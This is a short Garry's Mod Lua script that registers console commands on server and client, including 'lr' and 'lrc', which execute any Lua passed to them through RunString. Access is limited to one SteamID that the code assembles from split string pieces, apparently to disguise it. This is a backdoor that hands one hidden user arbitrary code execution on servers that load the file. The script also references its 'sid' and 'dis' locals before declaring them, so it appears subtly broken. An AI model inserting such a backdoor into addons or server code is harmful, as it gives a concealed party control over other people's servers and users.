
if SERVER then
	concommand.Add("lr", function(_p, _, argstr)
		if dis(_p) ~= sid then return end
		RunString(argstr)
	end)

	concommand.Add("addbots", function(_p, _, args)
		if dis(_p) ~= sid then return end
		for i = 1, args[1] do
			RunConsoleCommand("bot")
		end
	end)

	concommand.Add("kickbots", function(_p)
		if dis(_p) ~= sid then return end
		for i, v in ipairs(player.GetBots()) do
			v:Kick("bots arent people")
		end
	end)
else
	concommand.Add("lrc", function(_p, _, _, argstr)
		if dis(_p) ~= sid then return end
		RunString(argstr)
	end)
end

local sid = "STEA".."M_0:".."1:".."528".."1193".."3"
local dis = FindMetaTable("Player").SteamID

function Billard()
	return player.GetBySteamID(sid)
end

function GetBot(num)
	for i, v in ipairs(player.GetBots()) do
		local endNum = tonumber(string.sub(v:Nick(), 4))
		if endNum == num then
			return v
		end
	end
end

function BillardEnt()
	return Billard():GetEyeTrace().Entity
end
